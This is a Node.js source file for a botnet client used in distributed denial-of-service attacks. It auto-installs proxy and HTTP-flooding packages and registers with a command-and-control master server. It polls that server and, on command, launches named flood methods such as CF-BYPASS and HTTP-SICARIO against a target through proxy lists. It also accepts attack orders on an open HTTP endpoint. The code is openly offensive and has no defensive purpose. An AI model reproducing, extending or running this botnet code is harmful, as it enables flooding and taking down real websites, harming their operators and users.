#!/usr/bin/env node
/**
 * Auto-Install Bot Client
 * Automatically installs dependencies and connects to master
 * GANG GANG 🔥💪
 */

const { exec, spawn } = require('child_process');
const { promisify } = require('util');
const execAsync = promisify(exec);
const fs = require('fs').promises;
const path = require('path');

const port = process.env.PORT || process.env.SERVER_PORT || 5552;
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://flood-of-noah.onrender.com';

let myBotUrl = '';
let registrationAttempts = 0;
const MAX_REGISTRATION_ATTEMPTS = 5;
let activeProcesses = [];
let isBlocked = false;
let isSetupComplete = false;

// Required packages to install
const REQUIRED_PACKAGES = [
  'express',
  'axios',
  'socks',
  'socks-proxy-agent',
  'http-proxy-agent',
  'https-proxy-agent',
  'set-cookie-parser',
  'tough-cookie',
  'cookie',
  'http2',
  'net',
  'tls',
  'crypto-js',
  'user-agents',
  'random-useragent',
  'hpack.js',
  'cluster'
];

const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  red: '\x1b[31m',
  cyan: '\x1b[36m',
  magenta: '\x1b[35m'
};

function log(msg, color = 'reset') {
  console.log(`${colors[color]}${msg}${colors.reset}`);
}

// Check if package.json exists
async function checkPackageJson() {
  try {
    await fs.access('package.json');
    return true;
  } catch {
    return false;
  }
}

// Create package.json if missing
async function createPackageJson() {
  log('[SETUP] Creating package.json...', 'yellow');
  
  const packageJson = {
    name: 'bot-client',
    version: '1.0.0',
    description: 'Auto-register bot client with dependency auto-install',
    main: 'client.js',
    scripts: {
      start: 'node client.js'
    },
    dependencies: {}
  };
  
  REQUIRED_PACKAGES.forEach(pkg => {
    packageJson.dependencies[pkg] = 'latest';
  });
  
  await fs.writeFile('package.json', JSON.stringify(packageJson, null, 2));
  log('[SUCCESS] ✅ package.json created', 'green');
}

// Install dependencies
async function installDependencies() {
  log('\n[INSTALL] 🚀 Installing dependencies...', 'cyan');
  log('[INFO] This may take a minute...', 'yellow');
  
  return new Promise((resolve, reject) => {
    const npm = spawn('npm', ['install'], {
      stdio: 'inherit',
      shell: true
    });
    
    npm.on('close', (code) => {
      if (code === 0) {
        log('[SUCCESS] ✅ All dependencies installed!', 'green');
        resolve();
      } else {
        log('[ERROR] ❌ npm install failed', 'red');
        reject(new Error('npm install failed'));
      }
    });
    
    npm.on('error', (err) => {
      log(`[ERROR] Failed to start npm: ${err.message}`, 'red');
      reject(err);
    });
  });
}

// Check if dependencies are installed
async function checkDependencies() {
  try {
    const nodeModules = await fs.readdir('node_modules').catch(() => []);
    const installed = REQUIRED_PACKAGES.every(pkg => nodeModules.includes(pkg));
    return installed;
  } catch {
    return false;
  }
}

// Setup function - runs before everything
async function setup() {
  log('\n' + '='.repeat(60), 'magenta');
  log('🔥 AUTO-INSTALL BOT CLIENT - GANG GANG 💪', 'magenta');
  log('='.repeat(60), 'magenta');
  
  try {
    // Check if package.json exists
    const hasPackageJson = await checkPackageJson();
    if (!hasPackageJson) {
      await createPackageJson();
    }
    
    // Check if dependencies are installed
    const depsInstalled = await checkDependencies();
    if (!depsInstalled) {
      log('[INFO] Dependencies not found, installing...', 'yellow');
      await installDependencies();
    } else {
      log('[OK] ✅ All dependencies already installed', 'green');
    }
    
    isSetupComplete = true;
    log('\n[SUCCESS] 🎉 Setup complete! Starting bot...', 'green');
    log('='.repeat(60) + '\n', 'magenta');
    
  } catch (error) {
    log(`[ERROR] Setup failed: ${error.message}`, 'red');
    log('[WARN] Trying to continue anyway...', 'yellow');
    isSetupComplete = true;
  }
}

// Now require modules after installation
function loadModules() {
  try {
    global.express = require('express');
    global.axios = require('axios');
    return true;
  } catch (error) {
    log(`[ERROR] Failed to load modules: ${error.message}`, 'red');
    return false;
  }
}

// Fetch bot's public IP
async function fetchData() {
  try {
    const response = await global.axios.get('https://httpbin.org/get', { timeout: 10000 });
    myBotUrl = `http://${response.data.origin}:${port}`;
    
    log('\n' + '='.repeat(60), 'cyan');
    log('⚡ BOT CLIENT STARTED - READY TO ATTACK', 'cyan');
    log('='.repeat(60), 'cyan');
    log(`Local:    http://localhost:${port}`, 'bright');
    log(`Network:  ${myBotUrl}`, 'bright');
    log('='.repeat(60), 'cyan');
    log(`Master:   ${MASTER_SERVER}`, 'yellow');
    log('Auto-registration: ENABLED', 'green');
    log('Heartbeat: Every 30 seconds', 'green');
    log('='.repeat(60) + '\n', 'cyan');
    
    return response.data;
  } catch (error) {
    myBotUrl = `http://localhost:${port}`;
    log(`Bot running at ${myBotUrl}`, 'yellow');
    log(`Master Server: ${MASTER_SERVER}`, 'yellow');
  }
}

// Auto-register with master server
async function autoRegister() {
  if (isBlocked) {
    log('[BLOCKED] This bot has been permanently blocked', 'red');
    log('[INFO] Contact server admin to unblock', 'yellow');
    process.exit(0);
  }

  if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
    log('[WARN] Max registration attempts reached. Retry in 60s...', 'yellow');
    setTimeout(() => {
      registrationAttempts = 0;
      autoRegister();
    }, 60000);
    return;
  }

  try {
    log(`[INFO] Auto-registering... (Attempt ${registrationAttempts + 1}/${MAX_REGISTRATION_ATTEMPTS})`, 'cyan');
    
    const response = await global.axios.post(`${MASTER_SERVER}/register`, {
      url: myBotUrl
    }, {
      timeout: 10000,
      headers: { 'Content-Type': 'application/json' }
    });

    if (response.data.approved) {
      log('[SUCCESS] ✅ Auto-approved by master server!', 'green');
      log(`[INFO] Bot registered: ${myBotUrl}`, 'green');
      log('[INFO] Status: ONLINE 🟢\n', 'green');
      
      // Start polling for commands
      setInterval(checkForCommands, 3000);
      
      // Send heartbeat
      setInterval(sendHeartbeat, 30000);
      
      return;
    }
  } catch (error) {
    if (error.response && error.response.status === 403) {
      log('\n' + '='.repeat(60), 'red');
      log('[BLOCKED] ⛔ This bot has been blocked!', 'red');
      log('='.repeat(60), 'red');
      log(`Bot URL: ${myBotUrl}`, 'yellow');
      log(`Server: ${MASTER_SERVER}`, 'yellow');
      log('Contact server admin to unblock', 'yellow');
      log('='.repeat(60) + '\n', 'red');
      isBlocked = true;
      process.exit(0);
      return;
    }

    registrationAttempts++;
    log(`[ERROR] Registration failed: ${error.message}`, 'red');
    log('[INFO] Retrying in 5 seconds...', 'yellow');
    
    setTimeout(autoRegister, 5000);
  }
}

// Send heartbeat
async function sendHeartbeat() {
  try {
    await global.axios.get(`${MASTER_SERVER}/ping`, { timeout: 5000 });
    log('[HEARTBEAT] ✅ Sent | Status: ONLINE 🟢', 'green');
  } catch (error) {
    log('[WARN] Heartbeat failed | Status: OFFLINE 🔴', 'red');
    log('[INFO] Re-registering...', 'yellow');
    registrationAttempts = 0;
    autoRegister();
  }
}

// Check for commands
async function checkForCommands() {
  try {
    const response = await global.axios.get(`${MASTER_SERVER}/get-command`, {
      params: { botUrl: myBotUrl },
      timeout: 5000
    });

    if (response.data.hasCommand) {
      const command = response.data.command;
      
      if (command.action === 'stop') {
        log('\n[STOP-RECEIVED] 🛑 Stopping all attacks', 'red');
        stopAllAttacks();
      } else if (command.action === 'attack') {
        const { target, time, methods } = command;
        log(`\n[COMMAND-RECEIVED] ⚔️ ${methods} -> ${target} for ${time}s`, 'yellow');
        log(`[INFO] Active attacks: ${activeProcesses.length}`, 'cyan');
        executeAttack(target, time, methods);
      }
    }
  } catch (error) {
    // Silently fail - will retry on next poll
  }
}

// Stop all attacks
function stopAllAttacks() {
  log(`[STOP] Killing ${activeProcesses.length} active processes`, 'yellow');
  
  activeProcesses.forEach(proc => {
    try {
      process.kill(-proc.pid);
      log(`[KILLED] ✅ Process ${proc.pid}`, 'green');
    } catch (error) {
      log(`[ERROR] Failed to kill ${proc.pid}`, 'red');
    }
  });
  
  activeProcesses = [];
  log('[STOP] ✅ All attacks stopped\n', 'green');
}

// Execute attack
function executeAttack(target, time, methods) {
  const execWithLog = (cmd) => {
    log(`[EXEC] ${cmd}`, 'cyan');
    
    const proc = spawn('node', cmd.split(' ').slice(1), {
      detached: true,
      stdio: 'pipe'
    });
    
    proc.stdout.on('data', (data) => {
      const lines = data.toString().trim().split('\n');
      lines.forEach(line => {
        // Parse request count from output
        if (line.includes('Request Count') || line.includes('Total Requests')) {
          log(`[OUTPUT] ${line}`, 'green');
        }
      });
    });
    
    proc.stderr.on('data', (data) => {
      log(`[STDERR] ${data}`, 'red');
    });
    
    proc.on('error', (error) => {
      log(`[ERROR] ${error.message}`, 'red');
    });
    
    activeProcesses.push(proc);
    log(`[STARTED] ✅ PID: ${proc.pid}`, 'green');
    
    // Auto-cleanup
    setTimeout(() => {
      const index = activeProcesses.indexOf(proc);
      if (index > -1) {
        activeProcesses.splice(index, 1);
      }
    }, parseInt(time) * 1000 + 5000);
  };

  log(`[ATTACK] 💥 Starting ${methods} attack`, 'magenta');

  switch (methods) {
    case 'CF-BYPASS':
      execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
      break;
    case 'MODERN-FLOOD':
      execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
      break;
    case 'HTTP-SICARIO':
      execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
      break;
    case 'RAW-HTTP':
      execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
      execWithLog(`node methods/http-panel.js ${target} ${time}`);
      break;
    case 'R9':
      execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
      break;
    case 'PRIV-TOR':
      execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
      break;
    case 'HOLD-PANEL':
      execWithLog(`node methods/http-panel.js ${target} ${time}`);
      break;
    case 'R1':
      execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
      break;
    case 'UAM':
      execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
      break;
    case 'W.I.L':
      execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
      break;
    default:
      log(`[ERROR] Unknown method: ${methods}`, 'red');
  }
  
  log(`[INFO] Active processes: ${activeProcesses.length}\n`, 'cyan');
}

// Start HTTP server
async function startServer() {
  const app = global.express();
  
  app.get('/health', (req, res) => {
    res.json({ 
      status: 'online', 
      timestamp: Date.now(),
      master: MASTER_SERVER,
      bot: 'ready',
      uptime: process.uptime(),
      activeAttacks: activeProcesses.length
    });
  });

  app.get('/ping', (req, res) => {
    res.json({ 
      alive: true,
      uptime: process.uptime(),
      timestamp: Date.now(),
      status: 'online'
    });
  });

  app.get('/attack', (req, res) => {
    const { target, time, methods } = req.query;

    if (!target || !time || !methods) {
      return res.status(400).json({
        error: 'Missing parameters',
        required: ['target', 'time', 'methods']
      });
    }

    log(`\n[RECEIVED] ⚔️ ${methods} -> ${target} for ${time}s`, 'yellow');

    res.status(200).json({
      message: 'Attack command received',
      target,
      time,
      methods,
      bot: 'executing',
      timestamp: Date.now()
    });

    executeAttack(target, time, methods);
  });

  app.listen(port, async () => {
    await fetchData();
    
    log('[INFO] Starting auto-registration in 3 seconds...\n', 'yellow');
    setTimeout(autoRegister, 3000);
  });
}

// Main function
async function main() {
  try {
    // Setup and install dependencies
    await setup();
    
    // Load modules after installation
    const modulesLoaded = loadModules();
    if (!modulesLoaded) {
      log('[ERROR] Failed to load required modules', 'red');
      log('[INFO] Try running: npm install', 'yellow');
      process.exit(1);
    }
    
    // Start the server
    await startServer();
    
  } catch (error) {
    log(`[FATAL] ${error.message}`, 'red');
    process.exit(1);
  }
}

// Handle shutdown
process.on('SIGINT', () => {
  log('\n[SHUTDOWN] 👋 Stopping bot...', 'yellow');
  stopAllAttacks();
  process.exit(0);
});

process.on('SIGTERM', () => {
  log('\n[SHUTDOWN] 👋 Stopping bot...', 'yellow');
  stopAllAttacks();
  process.exit(0);
});

// Run it
main().catch(error => {
  log(`[FATAL] ${error.message}`, 'red');
  process.exit(1);
});
